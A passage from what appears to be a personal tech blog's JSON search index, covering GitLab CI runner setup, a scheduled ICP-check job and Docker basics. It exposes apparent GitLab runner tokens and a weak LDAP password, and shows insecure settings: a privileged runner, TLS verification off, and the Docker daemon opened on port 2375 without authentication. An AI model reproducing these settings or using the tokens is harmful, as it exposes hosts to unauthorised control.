Machine\u003c/li\u003e\n\u003cli\u003eKubernetes\u003c/li\u003e\n\u003cli\u003eElse\u0026hellip;\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"references\"\u003eReferences\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://docs.gitlab.com/ee/ci/\" target=\"_blank\" rel=\"noopener\"\u003eGitlab CI/CD\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://docs.gitlab.com/runner/\" target=\"_blank\" rel=\"noopener\"\u003eGitlab Runner\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://docs.gitlab.com/ee/ci/yaml/\" target=\"_blank\" rel=\"noopener\"\u003e.gitlab-ci.yaml\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"runner\"\u003eRunner\u003c/h2\u003e\n\u003ch3 id=\"register\"\u003eRegister\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003egitlab-runner register\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"after-register\"\u003eAfter register\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-toml\" data-lang=\"toml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003econcurrent\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003echeck_interval\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e[\u003cspan style=\"color:#a6e22e\"\u003esession_server\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003esession_timeout\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e1800\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e[[\u003cspan style=\"color:#a6e22e\"\u003erunners\u003c/span\u003e]]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ename\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;public-shell\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://gitlab.go2cloudten.com/\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003etoken\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;-mdH9OAOzG5yPsf_AVnW\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eexecutor\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;shell\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e[[\u003cspan style=\"color:#a6e22e\"\u003erunners\u003c/span\u003e]]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ename\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;public-docker\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://gitlab.go2cloudten.com/\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003etoken\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;AcEGPPKTS1uuQ_A_qpWy\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eexecutor\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;docker\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  [\u003cspan style=\"color:#a6e22e\"\u003erunners\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003edocker\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003edns\u003c/span\u003e = [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;192.168.185.5\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;192.168.185.6\u0026#34;\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003etls_verify\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eimage\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;registry.go2cloudten.com/it/office_sop/node:12.13.0\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eprivileged\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003edisable_entrypoint_overwrite\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eoom_kill_disable\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003edisable_cache\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eshm_size\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003epull_policy\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;if-not-present\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003evolumes\u003c/span\u003e = [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/cache\u0026#34;\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"repository\"\u003eRepository\u003c/h2\u003e\n\u003ch3 id=\"gitlab-ciyaml\"\u003e.gitlab-ci.yaml\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003estages\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  - \u003cspan style=\"color:#ae81ff\"\u003edomain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003echeck-icp\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003estage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003edomain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eimage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eregistry.go2cloudten.com/it/office_sop/icp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003etags\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#ae81ff\"\u003edocker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003escript\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#ae81ff\"\u003edomains=$(awk -F \u0026#39;|\u0026#39; \u0026#39;{if($6 ~ \u0026#34;Y\u0026#34; \u0026amp;\u0026amp; ($7 ~ \u0026#34;West\u0026#34; || $7 ~ \u0026#34;Yuqu\u0026#34;)) print $3}\u0026#39; domains-info.md | sed \u0026#39;s/ //g\u0026#39; | sort | uniq)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#ae81ff\"\u003eif [[ \u0026#34;${domains}\u0026#34; == \u0026#34;\u0026#34; ]]; then telegram.sh \u0026#39;There is no domain in list\u0026#39; ; else telegram.sh \u0026#39;Start checking ICP.\u0026#39; ; fi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#ae81ff\"\u003efor i in ${domains}; do result=$(checkicp ${i}); if [[ \u0026#34;${result}\u0026#34; == \u0026#34;未备案\u0026#34; ]];then telegram.sh \u0026#34;${i} 未备案\u0026#34;; sleep 1 ;fi;done\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#ae81ff\"\u003etelegram.sh \u0026#39;ICP check completed.\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eonly\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#ae81ff\"\u003eschedules\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["Gitlab","introduction","slides","CI"],"title":"Gitlab-CI Introduction"},{"categories":["URL","SHELL","Linux"],"contents":" SHELL 编程之常用技巧 SHELL 编程之内建命令 SHELL 编程之特殊符号 ","date":"September 22, 2021","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210922-shellbian-cheng-zhi-chang-yong-ji-qiao/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://zorrozou.github.io/docs/books/shellbian-cheng-zhi-chang-yong-ji-qiao.html\" target=\"_blank\" rel=\"noopener\"\u003eSHELL 编程之常用技巧\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://zorrozou.github.io/docs/books/shellbian-cheng-zhi-nei-jian-ming-ling.html\" target=\"_blank\" rel=\"noopener\"\u003eSHELL 编程之内建命令\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://zorrozou.github.io/docs/books/shellbian-cheng-zhi-te-shu-fu-hao.html\" target=\"_blank\" rel=\"noopener\"\u003eSHELL 编程之特殊符号\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","SHELL","Linux"],"title":"SHELL编程之常用技巧"},{"categories":["Docker"],"contents":"Docker Concept VM vs Container VM - Base on OS Container - Base on Application (Linux Kernel: Namespace and Cgroup) Client to Server Docker daemon - containerd, docker-containerd-shim, docker-runc Docker client - cli command docker cli -\u0026gt; docker daemon -\u0026gt; containerd -\u0026gt; runc -\u0026gt; namespace \u0026amp; cgroup Image Snapshots Container Read-Only processes on image Hub / Registry Store images References Docker —— 從入門到實踐 docker docs Docker commands Dockerfile ARG dist=\u0026#34;/tmp/password\u0026#34; ARG projectDir=\u0026#34;/password\u0026#34; FROM golang:1.16-alpine3.14 AS builder RUN apk add build-base upx ARG dist ARG projectDir WORKDIR ${projectDir} COPY . . RUN go build -trimpath -o main cmd/main.go RUN upx -9 -o ${dist} main FROM scratch ARG dist ENV TZ=Asia/Taipei COPY --from=builder ${dist} /usr/local/bin/password Dockerfile1 FROM alpine CMD [\u0026#34;nc\u0026#34;,\u0026#34;-l\u0026#34;,\u0026#34;12345\u0026#34;] Dockerfile2 FROM alpine CMD [\u0026#34;echo\u0026#34;,\u0026#34;DOCKER\u0026#34;] docker build command docker build . -t program docker build . -f Dockerfile -t test_mysql docker build . -t hello:v1.1 --build-arg dist=/tmp/hello --build-arg projectDir=/hello docker build . docker/status echo -e \u0026#34;${GREEN}Before build${RESET}\u0026#34; docker image ls docker build . -f docker/Dockerfile1 -t test1 docker build . -f docker/Dockerfile2 -t test2 docker image . docker/status echo -e \u0026#34;${GREEN}After build${RESET}\u0026#34; docker image ls docker run AND rm . docker/status echo -e \u0026#34;${GREEN}Run container1${RESET}\u0026#34; docker run -d --name container1 test1 echo -e \u0026#34;${GREEN}Run container2${RESET}\u0026#34; docker run -d --name container2 test2 echo -e \u0026#34;${GREEN}List alive containers${RESET}\u0026#34; docker ps echo -e \u0026#34;${GREEN}List all containers${RESET}\u0026#34; docker ps -a echo -e \u0026#34;${GREEN}Remove alive container${RESET}\u0026#34; docker rm -f container1 echo -e \u0026#34;${GREEN}List all containers${RESET}\u0026#34; docker ps -a echo -e \u0026#34;${GREEN}Remove exit container${RESET}\u0026#34; docker rm container2 echo -e \u0026#34;${GREEN}List all containers${RESET}\u0026#34; docker ps -a docker pull AND rmi . docker/status echo -e \u0026#34;${GREEN}List all image${RESET}\u0026#34; docker image ls echo -e \u0026#34;${GREEN}Pull alpine image${RESET}\u0026#34; docker pull alpine echo -e \u0026#34;${GREEN}List all image${RESET}\u0026#34; docker image ls docker rmi . docker/status echo -e \u0026#34;${GREEN}Remove alpine image${RESET}\u0026#34; docker rmi alpine echo -e \u0026#34;${GREEN}List all image${RESET}\u0026#34; docker image ls prune docker system prune -f --volumes docker history . docker/status echo -e \u0026#34;${GREEN}History of test1${RESET}\u0026#34; docker history test1 echo -e \u0026#34;${GREEN}History of mysql:8${RESET}\u0026#34; docker history mysql:8 Docker remote Edit service file # /lib/systemd/system/docker.service ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock -H tcp://0.0.0.0:2375 Restart service systemctl daemon-reload systemctl restart docker Specify DOCKER_HOST . docker/status echo -e \u0026#34;${GREEN}List images on 192.168.185.9${RESET}\u0026#34; DOCKER_HOST=192.168.185.9:2375 docker images Docker-compose version: \u0026#34;3\u0026#34; services: svn: image: zeyanlin/svn environment: - LDAP_HOSTS=${LDAP_HOSTS} - LDAP_BASE_DN=${LDAP_BASE_DN} - LDAP_BIND_DN=${LDAP_BIND_DN} - LDAP_ADMIN_PASS=${LDAP_ADMIN_PASS} ports: - 8000:80 - 3690:3690 depends_on: - ldap ldap: image: zeyanlin/openldap environment: - LDAP_DOMAIN=${LDAP_DOMAIN} - LDAP_ADMIN_PASS=${LDAP_ADMIN_PASS} ports: - 389:389 - 636:636 php: image: zeyanlin/phpldapadmin environment: - LDAP_HOSTS=${LDAP_HOSTS} ports: - 80:80 depends_on: - ldap Env LDAP_HOSTS=ldap LDAP_DOMAIN=\u0026#34;knowhow.fun\u0026#34; LDAP_BASE_DN=\u0026#34;dc=knowhow,dc=fun\u0026#34; LDAP_BIND_DN=\u0026#34;cn=admin\u0026#34; LDAP_ADMIN_PASS=\u0026#34;123qwe\u0026#34; ","date":"September 17, 2021","hero":"/images/hero/docker.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210917-docker/","summary":"\u003ch1 id=\"docker\"\u003eDocker\u003c/h1\u003e\n\u003ch2 id=\"concept\"\u003eConcept\u003c/h2\u003e\n\u003ch3 id=\"vm-vs-container\"\u003eVM vs Container\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eVM - Base on OS\u003c/li\u003e\n\u003cli\u003eContainer - Base on Application (Linux Kernel: Namespace and Cgroup)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"client-to-server\"\u003eClient to Server\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eDocker daemon - containerd, docker-containerd-shim, docker-runc\u003c/li\u003e\n\u003cli\u003eDocker client - cli command\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003edocker cli -\u0026gt; docker daemon -\u0026gt; containerd -\u0026gt; runc -\u0026gt; namespace \u0026amp; cgroup\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"image\"\u003eImage\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eSnapshots\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"container\"\u003eContainer\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eRead-Only processes on image\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"hub--registry\"\u003eHub / Registry\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eStore images\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"references\"\u003eReferences\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://philipzheng.gitbook.io/docker_practice/\" target=\"_blank\" rel=\"noopener\"\u003eDocker —— 從入門到實踐\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://docs.docker.com/\" target=\"_blank\" rel=\"noopener\"\u003edocker docs\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"docker-commands\"\u003eDocker commands\u003c/h2\u003e\n\u003ch3 id=\"dockerfile\"\u003eDockerfile\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-dockerfile\" data-lang=\"dockerfile\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eARG\u003c/span\u003e dist\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/tmp/password\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eARG\u003c/span\u003e projectDir\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/password\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e golang:1.16-alpine3.14 AS builder\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eRUN\u003c/span\u003e apk add build-base upx\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eARG\u003c/span\u003e dist\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eARG\u003c/span\u003e projectDir\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eWORKDIR\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e ${projectDir}\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eCOPY\u003c/span\u003e . .\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eRUN\u003c/span\u003e go build -trimpath -o main cmd/main.go\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eRUN\u003c/span\u003e upx -9 -o \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003edist\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e main\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e scratch\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eARG\u003c/span\u003e dist\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eENV\u003c/span\u003e TZ\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eAsia/Taipei\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eCOPY\u003c/span\u003e --from\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebuilder \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003edist\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e /usr/local/bin/password\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"dockerfile1\"\u003eDockerfile1\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-dockerfile\" data-lang=\"dockerfile\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e alpine\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eCMD\u003c/span\u003e [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;nc\u0026#34;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;-l\u0026#34;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;12345\u0026#34;\u003c/span\u003e]\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"dockerfile2\"\u003eDockerfile2\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-dockerfile\" data-lang=\"dockerfile\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e alpine\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eCMD\u003c/span\u003e [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;echo\u0026#34;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;DOCKER\u0026#34;\u003c/span\u003e]\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"docker-build-command\"\u003edocker build command\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" 